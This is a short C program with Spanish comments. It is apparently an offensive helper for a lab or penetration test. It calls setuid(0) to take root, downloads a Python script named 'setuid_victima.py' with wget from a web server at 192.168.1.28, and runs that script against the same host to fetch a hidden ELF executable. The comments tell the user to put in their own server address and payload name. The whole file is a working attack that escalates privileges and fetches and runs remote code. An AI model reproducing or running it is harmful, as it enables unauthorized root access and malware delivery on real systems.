#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(){
  setuid(0);
  // DESCARGA SCRIPT , ASIGNA LA DIRECCION DEL SERVIDOR WEB DONDE SE ALOJA EL SCRIPT
  system("wget http://192.168.1.28/setuid_victima.py");
  // PON EL NOMBRE DEL EJECUTABLE Y LA IP O EL DOMINIO AL QUE DESEA CONECTAR PARA SU DESCARGA
  system("python3 setuid_victima.py -r 192.168.1.28 -e .mi_prueba.elf");
  return 0;
}
